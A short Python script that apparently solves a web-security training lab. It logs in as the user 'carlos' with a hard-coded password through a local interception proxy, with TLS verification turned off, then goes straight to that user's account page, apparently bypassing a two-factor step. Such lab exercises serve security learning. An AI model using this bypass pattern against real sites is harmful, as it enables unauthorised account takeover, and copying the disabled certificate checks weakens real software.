import sys

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def access_carlos_account(s, url):
    # Login as carlos
    print("[*] Logging in as carlos....")
    login_url = url + "login"
    data = {"username": "carlos", "password": "montoya"}
    r = s.post(
        login_url, data=data, verify=False, proxies=proxies, allow_redirects=False
    )
    r.raise_for_status()
    r = s.get(url + "my-account?id=carlos", verify=False, proxies=proxies, timeout=5)
    if "Log out" in r.text:
        print("[+] Logged in as carlos")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)

    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)


if __name__ == "__main__":
    main()
